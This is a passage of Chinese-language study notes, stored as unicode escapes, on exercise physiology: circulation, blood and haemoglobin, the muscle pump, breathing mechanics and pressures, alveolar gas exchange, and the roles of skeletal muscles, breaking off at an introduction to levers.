\uff0c\u9759\u8109\u5c06\u8840\u6db2\u8f93\u9001\u56de\u5fc3\u810f\u3002\u867d\u7136\u5c0f\u9759\u8109\u4e5f\u6709\u808c\u8089\u6027\u8840\u7ba1\u58c1\uff0c\u4f46\u56e0\u4e3a\u9759\u8109\u7cfb\u7edf\u4e2d\u7684\u538b\u5f3a\u5f88\u4f4e\uff0c\u6240\u4ee5\u9759\u8109\u808c\u8089\u7ba1\u58c1\u5f88\u8584\u3002\u8fd9\u4f7f\u9759\u8109\u53ef\u4ee5\u5728\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u6536\u7f29\u6216\u6269\u5f20\uff0c\u4ece\u800c\u4f5c\u4e3a\u50a8\u5b58\u5668\uff0c\u50a8\u5b58\u6216\u591a\u6216\u5c11\u7684\u8840\u6db2\u3002\u6b64\u5916\uff0c\u67d0\u4e9b\u9759\u8109(\u4f8b\u5982\u817f\u90e8\u9759\u8109)\u5185\u6709\u5355\u5411\u7684\u9759\u8109\u74e3\uff0c\u901a\u8fc7\u963b\u6b62\u8840\u6db2\u9006\u6d41\u6765\u8f85\u52a9\u7ef4\u6301\u9759\u8109\u8840\u56de\u6d41\u3002 \u5fc3\u8840\u7ba1\u7cfb\u7edf\u8fd0\u8f93\u8425\u517b\u7269\u8d28\u5e76\u6e05\u9664\u5e9f\u7269\uff0c\u540c\u65f6\u6709\u52a9\u4e8e\u7ef4\u6301\u8eab\u4f53\u5185\u73af\u5883\u3002\u8840\u6db2\u5c06\u6c27\u6c14\u4ece\u80ba\u90e8\u8f93\u9001\u5230\u7ec4\u7ec7\u4ee5\u7528\u4e8e\u7ec6\u80de\u4ee3\u8c22\uff0c\u5e76\u5c06\u4e8c\u6c27\u5316\u78b3(\u6700\u591a\u7684\u4ee3\u8c22\u526f\u4ea7\u7269)\u4ece\u7ec4\u7ec7\u8f93\u9001\u5230\u80ba\u90e8\u547c\u51fa\u3002 \u8840\u6db2 \u8840\u6db2\u7684\u4e24\u4e2a\u6700\u91cd\u8981\u7684\u529f\u80fd \uff1a \u8fd0\u9001\u6c27\u6c14 \uff1a\u8840\u6db2\u5c06\u6c27\u6c14\u4ece\u80ba\u90e8\u8fd0\u9001\u5230\u8eab\u4f53\u7684\u5404\u4e2a\u7ec4\u7ec7\uff0c\u8fd9\u4e9b\u6c27\u6c14\u7528\u4e8e\u7ec6\u80de\u4ee3\u8c22\u3002 \u6e05\u9664\u4e8c\u6c27\u5316\u78b3 \uff1a\u8840\u6db2\u4ece\u7ec4\u7ec7\u4e2d\u5e26\u8d70\u4ee3\u8c22\u4ea7\u751f\u7684\u4e8c\u6c27\u5316\u78b3\uff0c\u5e76\u5c06\u5b83\u8fd0\u9001\u5230\u80ba\u90e8\u4ee5\u4fbf\u547c\u51fa\u3002 \u6c27\u6c14\u7684\u8fd0\u8f93 \uff1a\u6c27\u6c14\u901a\u8fc7\u8840\u7ea2\u86cb\u767d\u6765\u8fd0\u8f93\u3002\u8840\u7ea2\u86cb\u767d\u662f\u4e00\u79cd\u5b58\u5728\u4e8e\u7ea2\u7ec6\u80de\u4e2d\u7684\u94c1\u86cb\u767d\u5206\u5b50\u3002 \u8840\u7ea2\u86cb\u767d\u7684\u5176\u4ed6\u4f5c\u7528 \uff1a \u9178\u78b1\u7f13\u51b2\u6db2 \uff1a\u8840\u7ea2\u86cb\u767d\u8fd8\u80fd\u8c03\u8282\u8840\u6db2\u4e2d\u7684\u6c22\u79bb\u5b50\u6d53\u5ea6\uff0c\u8d77\u5230\u9178\u78b1\u7f13\u51b2\u6db2\u7684\u4f5c\u7528\u3002\u8fd9\u5bf9\u7ec6\u80de\u5185\u5316\u5b66\u53cd\u5e94\u7684\u901f\u7387\u975e\u5e38\u91cd\u8981\u3002 \u7ea2\u7ec6\u80de\u7684\u7ec4\u6210\u548c\u5176\u4ed6\u529f\u80fd \uff1a \u78b3\u9178\u9150\u9176 \uff1a\u7ea2\u7ec6\u80de\u4e2d\u542b\u6709\u5927\u91cf\u7684\u78b3\u9178\u9150\u9176\uff0c\u8fd9\u79cd\u9176\u53ef\u4ee5\u50ac\u5316\u4e8c\u6c27\u5316\u78b3\u548c\u6c34\u4e4b\u95f4\u7684\u53cd\u5e94\uff0c\u4ece\u800c\u4fc3\u8fdb\u4e8c\u6c27\u5316\u78b3\u7684\u6e05\u9664\u3002 \u808c\u8089\u6cf5 \u808c\u8089\u6cf5\u7684\u529f\u80fd \uff1a\u808c\u8089\u6cf5\uff08\u4e5f\u53eb\u9759\u8109\u6cf5\uff09\u662f\u4e00\u4e2a\u5728\u808c\u8089\u6536\u7f29\u65f6\u8f85\u52a9\u4f53\u6db2\u5faa\u73af\u7684\u7cfb\u7edf\u3002 \u5de5\u4f5c\u673a\u5236 \uff1a\u808c\u8089\u6cf5\u548c\u5177\u6709\u9759\u8109\u74e3\u7684\u9759\u8109\u7cfb\u7edf\u4e00\u8d77\u5de5\u4f5c\u3002\u5f53\u808c\u8089\u6536\u7f29\u65f6\uff0c\u4f1a\u6324\u538b\u9759\u8109\u3002\u7531\u4e8e\u9759\u8109\u4e2d\u6709\u9759\u8109\u74e3\uff0c\u8840\u6db2\u53ea\u80fd\u671d\u4e00\u4e2a\u65b9\u5411\u6d41\u52a8\uff0c\u56e0\u6b64\u8840\u6db2\u88ab\u6324\u538b\u56de\u5fc3\u810f\u3002 \u8fd0\u52a8\u540e\u7684\u4f5c\u7528 \uff1a\u8fd9\u79cd\u673a\u5236\u89e3\u91ca\u4e86\u4e3a\u4ec0\u4e48\u4eba\u5728\u8fd0\u52a8\u540e\u9700\u8981\u7ee7\u7eed\u8d70\u52a8\uff0c\u4ee5\u9632\u6b62\u8840\u6db2\u5728\u4e0b\u80a2\u79ef\u805a\u3002\u5982\u679c\u8840\u6db2\u5728\u4e0b\u80a2\u79ef\u805a\uff0c\u4f1a\u589e\u52a0\u8840\u6db2\u51dd\u56fa\u7684\u98ce\u9669\u3002 \u957f\u65f6\u95f4\u9759\u5750\u7684\u6ce8\u610f\u4e8b\u9879 \uff1a\u5728\u957f\u65f6\u95f4\u9759\u5750\u540e\uff0c\u65f6\u4e0d\u65f6\u5730\u6324\u538b\u808c\u8089\u4e5f\u5f88\u91cd\u8981\uff0c\u8fd9\u6837\u53ef\u4ee5\u4fc3\u8fdb\u8840\u6db2\u56de\u6d41\u5230\u5fc3\u810f\uff0c\u907f\u514d\u8840\u6db2\u5728\u4e0b\u80a2\u79ef\u805a\u3002 \u547c\u5438\u7cfb\u7edf \u547c\u5438\u7cfb\u7edf\u7684\u4e3b\u8981\u529f\u80fd \uff1a\u547c\u5438\u7cfb\u7edf\u7684\u4e3b\u8981\u529f\u80fd\u662f\u8fdb\u884c\u6c27\u6c14\u548c\u4e8c\u6c27\u5316\u78b3\u7684\u4ea4\u6362\u3002 \u4eba\u7c7b\u547c\u5438\u7cfb\u7edf\u7684\u89e3\u5256\u7ed3\u6784 \uff1a \u5f53\u7a7a\u6c14\u901a\u8fc7\u9f3b\u5b50\u65f6\uff0c\u9f3b\u8154\u6709\u4e09\u4e2a\u529f\u80fd\uff1a\u52a0\u6e29\u3001\u52a0\u6e7f\u548c\u51c0\u5316\u7a7a\u6c14\u3002 \u7136\u540e\u7a7a\u6c14\u901a\u8fc7\u6c14\u7ba1\u3001\u652f\u6c14\u7ba1\u548c\u7ec6\u652f\u6c14\u7ba1\u5230\u8fbe\u80ba\u90e8\u3002 \u6c14\u7ba1\u548c\u652f\u6c14\u7ba1\u7684\u5206\u7c7b \uff1a \u6c14\u7ba1\u88ab\u79f0\u4e3a\u7b2c\u4e00\u7ea7\u547c\u5438\u9053\u3002 \u5de6\u53f3\u4e3b\u652f\u6c14\u7ba1\u4e3a\u7b2c\u4e8c\u7ea7\u547c\u5438\u9053\u3002 \u4e4b\u540e\u7684\u6bcf\u4e00\u4e2a\u5206\u652f\uff08\u7ec6\u652f\u6c14\u7ba1\uff09\u90fd\u662f\u4e0b\u4e00\u7ea7\u547c\u5438\u9053\u3002 \u547c\u5438\u9053\u7684\u5206\u7ea7 \uff1a \u7a7a\u6c14\u6700\u7ec8\u5230\u8fbe\u80ba\u6ce1\u4e4b\u524d\uff0c\u9700\u8981\u7ecf\u8fc7\u5927\u7ea623\u7ea7\u547c\u5438\u9053\u3002 \u5728\u80ba\u6ce1\u4e2d\uff0c\u6c14\u4f53\u901a\u8fc7\u547c\u5438\u8fdb\u884c\u4ea4\u6362\u3002 \u7a7a\u6c14\u4ea4\u6362 \u80ba\u5bb9\u79ef\u7684\u63a7\u5236 \uff1a\u7a7a\u6c14\u6d41\u52a8\u91cf\u53ca\u8fdb\u51fa\u80ba\u7684\u7a7a\u6c14\u603b\u91cf\u662f\u7531\u80ba\u5bb9\u79ef\u7684\u589e\u5927\u548c\u7f29\u5c0f\u63a7\u5236\u7684\u3002\u80ba\u90e8\u672c\u8eab\u4e0d\u80fd\u81ea\u4e3b\u5730\u6269\u5f20\u548c\u6536\u7f29\uff0c\u800c\u662f\u901a\u8fc7\u4e24\u79cd\u65b9\u5f0f\u8fdb\u884c\uff1a \u8188\u819c\u7684\u6536\u7f29\u548c\u8212\u5f20 \uff1a\u8188\u819c\u7684\u8fd0\u52a8\u6539\u53d8\u80f8\u8154\u7684\u4f53\u79ef\u3002 \u808b\u9aa8\u7684\u5347\u9ad8\u548c\u4e0b\u843d \uff1a\u6539\u53d8\u80f8\u8154\u524d\u540e\u76f4\u5f84\u3002 \u5e73\u9759\u547c\u5438 \uff1a\u5728\u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u5e73\u9759\u547c\u5438\u51e0\u4e4e\u5b8c\u5168\u4f9d\u8d56\u8188\u819c\u7684\u8fd0\u52a8\u5b8c\u6210\u3002 \u5438\u6c14\u65f6 \uff1a\u8188\u808c\u6536\u7f29\uff0c\u80f8\u8154\u4ea7\u751f\u8d1f\u538b\uff08\u771f\u7a7a\uff09\uff0c\u7a7a\u6c14\u88ab\u5438\u5165\u80ba\u90e8\u3002 \u547c\u6c14\u65f6 \uff1a\u8188\u819c\u653e\u677e\uff0c\u80ba\u90e8\u548c\u5468\u56f4\u7ed3\u6784\u7684\u5f39\u6027\u56de\u7f29\u4f7f\u7a7a\u6c14\u88ab\u6392\u51fa\u3002 \u7528\u529b\u547c\u5438 \uff1a \u5728\u7528\u529b\u547c\u5438\u65f6\uff0c\u4ec5\u9760\u5f39\u6027\u56de\u7f29\u4e0d\u8db3\u4ee5\u4ea7\u751f\u8db3\u591f\u7684\u547c\u5438\u53cd\u5e94\u3002 \u5438\u6c14\u808c \uff1a\u9700\u8981\u989d\u5916\u7684\u529b\u91cf\u4e0a\u63d0\u80f8\u5ed3\u3002\u5438\u6c14\u808c\u5305\u62ec\u808b\u95f4\u5916\u808c\u3001\u80f8\u9501\u4e73\u7a81\u808c\u3001\u524d\u952f\u808c\u548c\u659c\u89d2\u808c\u3002 \u547c\u6c14\u808c \uff1a\u9700\u8981\u989d\u5916\u7684\u529b\u91cf\u538b\u7f29\u80f8\u5ed3\u3002\u547c\u6c14\u808c\u5305\u62ec\u8179\u808c\uff08\u8179\u76f4\u808c\u3001\u8179\u5185\u659c\u808c\u3001\u8179\u5916\u659c\u808c\u548c\u8179\u6a2a\u808c\uff09\u548c\u808b\u95f4\u5185\u808c\u3002 \u4e0a\u63d0\u80f8\u5ed3 \uff1a\u4e0a\u63d0\u80f8\u5ed3\u4f7f\u80f8\u9aa8\u5411\u524d\u79fb\u52a8\u5e76\u8fdc\u79bb\u810a\u67f1\uff0c\u4ece\u800c\u589e\u5927\u80f8\u8154\u5bb9\u91cf\u3002 \u7b80\u800c\u8a00\u4e4b\uff0c\u5438\u6c14\u808c\u548c\u547c\u6c14\u808c\u5728\u547c\u5438\u8fc7\u7a0b\u4e2d\u53d1\u6325\u7740\u91cd\u8981\u4f5c\u7528\u3002\u5438\u6c14\u808c\u5e2e\u52a9\u6269\u5f20\u80f8\u8154\uff0c\u5438\u5165\u7a7a\u6c14\uff1b\u547c\u6c14\u808c\u5e2e\u52a9\u538b\u7f29\u80f8\u8154\uff0c\u6392\u51fa\u7a7a\u6c14\u3002\u5e73\u9759\u547c\u5438\u4e3b\u8981\u4f9d\u9760\u8188\u819c\u7684\u8fd0\u52a8\uff0c\u800c\u7528\u529b\u547c\u5438\u65f6\u5219\u9700\u8981\u8fd9\u4e9b\u808c\u8089\u7684\u989d\u5916\u529b\u91cf\u6765\u8f85\u52a9\u3002 \u80f8\u819c\u8154\u5185\u538b \u80f8\u819c\u8154\u5185\u538b\u7684\u5b9a\u4e49 \uff1a\u80f8\u819c\u8154\u5185\u538b\u662f\u6307\u4f4d\u4e8e\u80ba\u8868\u9762\u7684\u80f8\u819c\u810f\u5c42\u4e0e\u4f4d\u4e8e\u80f8\u58c1\u5185\u8868\u9762\u7684\u80f8\u819c\u58c1\u5c42\u4e4b\u95f4\u72ed\u7a84\u7a7a\u9699\u7684\u538b\u529b\u3002 \u538b\u529b\u7279\u6027 \uff1a\u8fd9\u4e2a\u538b\u529b\u901a\u5e38\u662f\u5fae\u5f31\u7684\u8d1f\u538b\u3002 \u8d1f\u538b\u7684\u4f5c\u7528 \uff1a \u5438\u6c14\u65f6 \uff1a\u56e0\u4e3a\u80ba\u662f\u4e00\u79cd\u5f39\u6027\u7ed3\u6784\uff0c\u80f8\u8154\u7684\u6269\u5f20\u4f1a\u62c9\u52a8\u80ba\u7684\u8868\u9762\uff0c\u4ea7\u751f\u66f4\u591a\u7684\u8d1f\u538b\u3002\u8fd9\u79cd\u8d1f\u538b\u4f1a\u5e2e\u52a9\u5438\u6c14\uff0c\u4f7f\u7a7a\u6c14\u8fdb\u5165\u80ba\u90e8\u3002 \u547c\u6c14\u65f6 \uff1a\u8fd9\u4e2a\u8fc7\u7a0b\u662f\u76f8\u53cd\u7684\uff0c\u80f8\u8154\u6536\u7f29\uff0c\u8d1f\u538b\u51cf\u5c0f\uff0c\u7a7a\u6c14\u88ab\u6392\u51fa\u80ba\u90e8\u3002 \u80f8\u819c\u8154\u5185\u7684\u8d1f\u538b\u5728\u547c\u5438\u8fc7\u7a0b\u4e2d\u8d77\u5230\u5173\u952e\u4f5c\u7528\u3002\u5438\u6c14\u65f6\uff0c\u80f8\u8154\u7684\u6269\u5f20\u589e\u52a0\u8d1f\u538b\uff0c\u5e2e\u52a9\u7a7a\u6c14\u8fdb\u5165\u80ba\u90e8\uff1b\u547c\u6c14\u65f6\uff0c\u80f8\u8154\u6536\u7f29\uff0c\u8d1f\u538b\u51cf\u5c0f\uff0c\u7a7a\u6c14\u6392\u51fa\u3002\u8fd9\u79cd\u538b\u529b\u53d8\u5316\u4f7f\u5f97\u547c\u5438\u8fc7\u7a0b\u5f97\u4ee5\u987a\u5229\u8fdb\u884c\u3002 \u80ba\u5185\u538b \u80ba\u5185\u538b\u7684\u5b9a\u4e49 \uff1a\u80ba\u5185\u538b\u662f\u6307\u5728\u547c\u5438\u9053\u6253\u5f00\u4e14\u6ca1\u6709\u7a7a\u6c14\u8fdb\u51fa\u80ba\u90e8\u65f6\uff0c\u80ba\u6ce1\u5185\u7684\u538b\u529b\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u547c\u5438\u9053\u5185\u6240\u6709\u90e8\u5206\u7684\u538b\u529b\uff0c\u5305\u62ec\u80ba\u6ce1\u7684\u538b\u529b\uff0c\u90fd\u7b49\u4e8e\u5927\u6c14\u538b\u3002 \u5438\u6c14\u548c\u547c\u6c14\u4e2d\u7684\u80ba\u5185\u538b\u53d8\u5316 \uff1a \u5438\u6c14\u65f6 \uff1a\u4e3a\u4e86\u4f7f\u7a7a\u6c14\u8fdb\u5165\u80ba\u90e8\uff0c\u80ba\u5185\u538b\u5fc5\u987b\u4e0b\u964d\u5230\u7565\u4f4e\u4e8e\u5927\u6c14\u538b\u7684\u503c\u3002 \u547c\u6c14\u65f6 \uff1a\u4e3a\u4e86\u4f7f\u7a7a\u6c14\u6392\u51fa\u80ba\u90e8\uff0c\u80ba\u5185\u538b\u5fc5\u987b\u9ad8\u4e8e\u5927\u6c14\u538b\u3002 \u80fd\u91cf\u6d88\u8017 \uff1a \u9759\u606f\u72b6\u6001\u4e0b\u7684\u6b63\u5e38\u547c\u5438 \uff1a\u5728\u9759\u606f\u72b6\u6001\u4e0b\u6b63\u5e38\u547c\u5438\u65f6\uff0c\u8eab\u4f53\u6d88\u8017\u603b\u80fd\u91cf\u76843%\u52305%\u7528\u4e8e\u80ba\u901a\u6c14\uff08\u547c\u5438\u8fc7\u7a0b\uff09\u3002 \u9ad8\u5f3a\u5ea6\u8fd0\u52a8\u4e2d\u7684\u80fd\u91cf\u6d88\u8017 \uff1a\u5728\u9ad8\u5f3a\u5ea6\u8fd0\u52a8\u4e2d\uff0c\u6240\u9700\u7684\u80fd\u91cf\u53ef\u589e\u52a0\u5230\u603b\u80fd\u91cf\u6d88\u8017\u76848%\u523015%\u3002\u5982\u679c\u547c\u5438\u9053\u963b\u529b\u589e\u52a0\uff0c\u4f8b\u5982\u8fd0\u52a8\u8bf1\u53d1\u7684\u54ee\u5598\uff0c\u8fd9\u4e2a\u6bd4\u4f8b\u53ef\u80fd\u4f1a\u66f4\u9ad8\u3002 \u9884\u9632\u63aa\u65bd \uff1a \u7531\u4e8e\u9ad8\u5f3a\u5ea6\u8fd0\u52a8\u53ef\u80fd\u5bf9\u547c\u5438\u7cfb\u7edf\u9020\u6210\u4e00\u5b9a\u7a0b\u5ea6\u7684\u635f\u4f24\uff0c\u5efa\u8bae\u91c7\u53d6\u9884\u9632\u63aa\u65bd\u3002\u8fd9\u5305\u62ec\u7531\u533b\u751f\u4e8b\u5148\u5bf9\u8fd0\u52a8\u5458\u8fdb\u884c\u8bc4\u4f30\uff0c\u4ee5\u786e\u4fdd\u5176\u547c\u5438\u7cfb\u7edf\u5728\u8fd0\u52a8\u4e2d\u80fd\u591f\u6b63\u5e38\u8fd0\u4f5c\u3002 \u80ba\u5185\u538b\u5728\u5438\u6c14\u548c\u547c\u6c14\u8fc7\u7a0b\u4e2d\u5206\u522b\u9700\u8981\u4f4e\u4e8e\u548c\u9ad8\u4e8e\u5927\u6c14\u538b\u4ee5\u4fc3\u8fdb\u7a7a\u6c14\u6d41\u52a8\u3002\u6b63\u5e38\u547c\u5438\u6d88\u8017\u7684\u80fd\u91cf\u8f83\u5c11\uff0c\u4f46\u9ad8\u5f3a\u5ea6\u8fd0\u52a8\u65f6\u547c\u5438\u6240\u9700\u7684\u80fd\u91cf\u4f1a\u663e\u8457\u589e\u52a0\uff0c\u5c24\u5176\u662f\u5f53\u5b58\u5728\u547c\u5438\u9053\u963b\u529b\u65f6\u3002\u56e0\u6b64\uff0c\u9884\u9632\u63aa\u65bd\u548c\u533b\u7597\u8bc4\u4f30\u5bf9\u4e8e\u8fd0\u52a8\u5458\u662f\u5f88\u91cd\u8981\u7684\u3002 \u547c\u5438\u5176\u4ed6\u4ea4\u6362 \u6362\u6c14\u8fc7\u7a0b \uff1a\u5728\u6362\u6c14\u8fc7\u7a0b\u4e2d\uff0c\u6c27\u6c14\u4ece\u80ba\u6ce1\u6269\u6563\u5230\u80ba\u90e8\u8840\u6db2\u4e2d\uff0c\u4e8c\u6c27\u5316\u78b3\u4ece\u8840\u6db2\u6269\u6563\u5230\u80ba\u6ce1\u3002\u8fd9\u662f\u901a\u8fc7\u7b80\u5355\u7684\u968f\u673a\u5206\u5b50\u8fd0\u52a8\uff08\u6269\u6563\uff09\u8fdb\u884c\u7684\u3002 \u6269\u6563\u539f\u7406 \uff1a \u5206\u5b50\u8fd0\u52a8 \uff1a\u6269\u6563\u7684\u80fd\u91cf\u6765\u6e90\u4e8e\u5206\u5b50\u81ea\u8eab\u7684\u52a8\u529b\u5b66\u4f5c\u7528\u3002 \u6d53\u5ea6\u5dee \uff1a\u6c14\u4f53\u4ece\u9ad8\u6d53\u5ea6\u533a\u57df\u5411\u4f4e\u6d53\u5ea6\u533a\u57df\u6269\u6563\u3002 \u5f71\u54cd\u6269\u6563\u901f\u7387\u7684\u56e0\u7d20 \uff1a \u6d53\u5ea6\u5dee \uff1a\u4e24\u79cd\u6c14\u4f53\u7684\u6269\u6563\u901f\u7387\u53d6\u51b3\u4e8e\u5b83\u4eec\u5728\u6bdb\u7ec6\u8840\u7ba1\u548c\u80ba\u6ce1\u4e2d\u7684\u6d53\u5ea6\u3002 \u5206\u538b\u5dee \uff1a\u6bcf\u79cd\u6c14\u4f53\u7684\u5206\u538b\u5dee\u4e5f\u4f1a\u5f71\u54cd\u5176\u6269\u6563\u901f\u7387\u3002 \u9759\u606f\u72b6\u6001\u4e0b\u7684\u6c27\u6c14\u6269\u6563 \uff1a \u6c27\u5206\u538b\u5dee \uff1a\u9759\u606f\u72b6\u6001\u4e0b\uff0c\u80ba\u6ce1\u4e2d\u7684\u6c27\u5206\u538b\u6bd4\u80ba\u6ce1\u6bdb\u7ec6\u8840\u7ba1\u4e2d\u7684\u6c27\u5206\u538b\u9ad8\u7ea660 mmHg\u3002\u56e0\u6b64\uff0c\u6c27\u6c14\u4f1a\u4ece\u80ba\u6ce1\u6269\u6563\u5230\u6bdb\u7ec6\u8840\u7ba1\u4e2d\u7684\u8840\u6db2\u4e2d\u3002 \u4e8c\u6c27\u5316\u78b3\u6269\u6563 \uff1a\u540c\u65f6\uff0c\u4e8c\u6c27\u5316\u78b3\u6cbf\u76f8\u53cd\u65b9\u5411\u6269\u6563\uff0c\u4ece\u8840\u6db2\u6269\u6563\u5230\u80ba\u6ce1\u4e2d\u3002 \u6c14\u4f53\u4ea4\u6362\u7684\u901f\u5ea6 \uff1a\u8fd9\u79cd\u6c14\u4f53\u4ea4\u6362\u8fc7\u7a0b\u975e\u5e38\u8fc5\u901f\uff0c\u53ef\u4ee5\u8ba4\u4e3a\u662f\u77ac\u65f6\u53d1\u751f\u7684\u3002 \u6362\u6c14\u8fc7\u7a0b\u4e2d\u6c27\u6c14\u548c\u4e8c\u6c27\u5316\u78b3\u901a\u8fc7\u80ba\u6ce1\u548c\u6bdb\u7ec6\u8840\u7ba1\u819c\u7684\u6269\u6563\u6765\u8fdb\u884c\u6c14\u4f53\u4ea4\u6362\u3002\u6c27\u6c14\u4ece\u9ad8\u5206\u538b\u7684\u80ba\u6ce1\u6269\u6563\u5230\u4f4e\u5206\u538b\u7684\u8840\u6db2\u4e2d\uff0c\u800c\u4e8c\u6c27\u5316\u78b3\u5219\u4ece\u9ad8\u5206\u538b\u7684\u8840\u6db2\u6269\u6563\u5230\u4f4e\u5206\u538b\u7684\u80ba\u6ce1\u3002\u8fd9\u4e00\u8fc7\u7a0b\u4e3b\u8981\u53d7\u6c14\u4f53\u6d53\u5ea6\u5dee\u548c\u5206\u538b\u5dee\u7684\u9a71\u52a8\uff0c\u5e76\u4e14\u53d1\u751f\u5f97\u975e\u5e38\u8fc5\u901f\u3002 \u9aa8\u9abc\u808c\u7cfb\u7edf \u5728\u9aa8\u9abc\u4e0a\u3002\u4f20\u7edf\u4e0a\uff0c\u89e3\u5256\u5b66\u5bb6\u5c06\u808c\u8089\u7684\u8d77\u70b9\u5b9a\u4e49\u4e3a\u8fd1\u7aef\uff08\u671d\u5411\u8eab\u4f53\u7684\u4e2d\u5fc3\uff09\uff0c \u5e76\u5c06\u5176\u6b62\u70b9\u5b9a\u4e49\u4e3a\u8fdc\u7aef\uff08\u8fdc\u79bb\u8eab\u4f53\u7684\u4e2d\u5fc3\uff09\u3002 \u808c\u8089\u8fde\u63a5\u5230\u9aa8\u5934\u4e0a\u7684\u65b9\u5f0f \u76f4\u63a5\u9644\u7740 \uff1a\u901a\u5e38\u51fa\u73b0\u5728\u808c\u8089\u7684\u8fd1\u7aef\uff0c\u4e5f\u5c31\u662f\u9760\u8fd1\u8eab\u4f53\u4e2d\u8f74\u7684\u4e00\u7aef\u3002\u8fd9\u91cc\uff0c\u808c\u8089\u7ea4\u7ef4\u76f4\u63a5\u9644\u7740\u5728\u9aa8\u5934\u4e0a\uff0c\u9644\u7740\u9762\u79ef\u8f83\u5927\uff0c\u8fd9\u6837\u529b\u53ef\u4ee5\u5206\u6563\uff0c\u4e0d\u4f1a\u96c6\u4e2d\u5728\u4e00\u4e2a\u70b9\u4e0a\uff0c\u51cf\u5c11\u635f\u4f24\u7684\u98ce\u9669\u3002 \u7ea4\u7ef4\u6027\u9644\u7740 \uff1a\u6bd4\u5982\u808c\u8171\u548c\u808c\u9798\u4e0e\u9aa8\u5468\u56f4\u7684\u7ed3\u7f14\u7ec4\u7ec7\u878d\u5408\u5e76\u8fde\u63a5\u3002\u8fd9\u4e9b\u8fde\u63a5\u901a\u5e38\u4f1a\u6709\u989d\u5916\u7684\u7ea4\u7ef4\u5ef6\u4f38\u5230\u9aa8\u5934\u5185\u90e8\uff0c\u5f62\u6210\u975e\u5e38\u7d27\u5bc6\u7684\u7ed3\u5408\u3002\u8fd9\u79cd\u9644\u7740\u65b9\u5f0f\u975e\u5e38\u7262\u56fa\uff0c\u786e\u4fdd\u808c\u8089\u5728\u7528\u529b\u65f6\u80fd\u591f\u6709\u6548\u5730\u4f20\u9012\u529b\u91cf\u3002 \u808c\u8089\u6839\u636e\u52a8\u4f5c\u7684\u5206\u7c7b \u51e0\u4e4e\u6240\u6709\u7684\u8eab\u4f53\u52a8\u4f5c\u90fd\u9700\u8981\u591a\u5757\u808c\u8089\u534f\u540c\u5de5\u4f5c\u3002\u4ee5\u4e0b\u662f\u5bf9\u8fd9\u4e9b\u808c\u8089\u89d2\u8272\u7684\u7b80\u5355\u89e3\u91ca\uff1a \u4e3b\u52a8\u808c\uff08\u539f\u52a8\u808c\uff09 \uff1a\u8fd9\u4e9b\u662f\u76f4\u63a5\u53c2\u4e0e\u4ea7\u751f\u52a8\u4f5c\u7684\u808c\u8089\u3002\u4f8b\u5982\uff0c\u5728\u6295\u63b7\u52a8\u4f5c\u4e2d\uff0c\u80b1\u4e09\u5934\u808c\u662f\u4e3b\u52a8\u808c\uff0c\u5b83\u8d1f\u8d23\u4f38\u5c55\u8098\u90e8\u5e76\u52a0\u901f\u6295\u7403\u7684\u52a8\u4f5c\u3002 \u62ee\u6297\u808c \uff1a\u8fd9\u4e9b\u808c\u8089\u7684\u4f5c\u7528\u662f\u51cf\u6162\u6216\u505c\u6b62\u52a8\u4f5c\u3002\u4f8b\u5982\uff0c\u5728\u6295\u63b7\u8fc7\u7a0b\u4e2d\uff0c\u5f53\u8098\u5173\u8282\u63a5\u8fd1\u5b8c\u5168\u4f38\u5c55\u65f6\uff0c\u80b1\u4e8c\u5934\u808c\u4f5c\u4e3a\u62ee\u6297\u808c\u4f1a\u51cf\u901f\u5e76\u505c\u6b62\u8098\u5173\u8282\u7684\u8fd0\u52a8\uff0c\u4ece\u800c\u4fdd\u62a4\u5173\u8282\uff0c\u9632\u6b62\u97e7\u5e26\u548c\u8f6f\u9aa8\u53d7\u4f24\u3002 \u534f\u540c\u808c \uff1a\u8fd9\u4e9b\u662f\u95f4\u63a5\u5e2e\u52a9\u5b8c\u6210\u52a8\u4f5c\u7684\u808c\u8089\u3002\u4f8b\u5982\uff0c\u5728\u4e0a\u81c2\u6d3b\u52a8\u65f6\uff0c\u80a9\u80db\u9aa8\u7684\u7a33\u5b9a\u808c\u8089\u662f\u534f\u540c\u808c\u3002\u5982\u679c\u6ca1\u6709\u8fd9\u4e9b\u534f\u540c\u808c\uff0c\u8d1f\u8d23\u79fb\u52a8\u4e0a\u81c2\u7684\u808c\u8089\uff08\u5176\u4e2d\u8bb8\u591a\u8d77\u59cb\u4e8e\u80a9\u80db\u9aa8\uff09\u5c31\u65e0\u6cd5\u6709\u6548\u5de5\u4f5c\u3002\u5f53\u4e3b\u52a8\u808c\u7a7f\u8fc7\u4e24\u4e2a\u5173\u8282\u65f6\uff0c\u9700\u8981\u534f\u540c\u808c\u6765\u5171\u540c\u63a7\u5236\u8eab\u4f53\u7684\u8fd0\u52a8\u3002 \u4e3e\u4e2a\u4f8b\u5b50\uff0c\u5f53\u4f60\u4ece\u6df1\u8e72\u4f4d\u7ad9\u8d77\u65f6\uff0c\u6d89\u53ca\u4f38\u9acb\u548c\u4f38\u819d\u4e24\u4e2a\u52a8\u4f5c\u3002\u80a1\u76f4\u808c\u7a7f\u8fc7\u9acb\u5173\u8282\u548c\u819d\u5173\u8282\uff0c\u5f53\u5b83\u6536\u7f29\u65f6\u4f1a\u5c48\u9acb\u548c\u4f38\u819d\u3002\u5982\u679c\u4f60\u7ad9\u8d77\u65f6\u80a1\u76f4\u808c\u6536\u7f29\u4f7f\u819d\u5173\u8282\u4f38\u5c55\uff0c\u540c\u65f6\u8981\u4fdd\u6301\u8eab\u4f53\u4e0d\u524d\u503e\uff0c\u90a3\u4e48\u81c0\u5927\u808c\uff08\u4f38\u9acb\u808c\u7fa4\uff09\u5fc5\u987b\u534f\u540c\u4f5c\u7528\uff0c\u4ee5\u62b5\u6d88\u80a1\u76f4\u808c\u6536\u7f29\u5f15\u8d77\u7684\u9acb\u5173\u8282\u5c48\u66f2\u3002 \u8fd9\u4e9b\u808c\u8089\u89d2\u8272\u7684\u534f\u8c03\u4f5c\u7528\uff0c\u786e\u4fdd\u52a8\u4f5c\u7684\u51c6\u786e\u6027\u548c\u7a33\u5b9a\u6027\uff0c\u540c\u65f6\u4fdd\u62a4\u5173\u8282\u548c\u97e7\u5e26\u514d\u53d7\u635f\u4f24\u3002 \u4ec0\u4e48\u662f\u6760\u6746 \u652f\u70b9 \uff1a\u6760\u6746\u7684\u652f\u6491\u70b9\uff0c\u662f\u6760\u6746\u65cb\u8f6c\u7684\u4e2d\u5fc3\u3002 \u6760\u6746 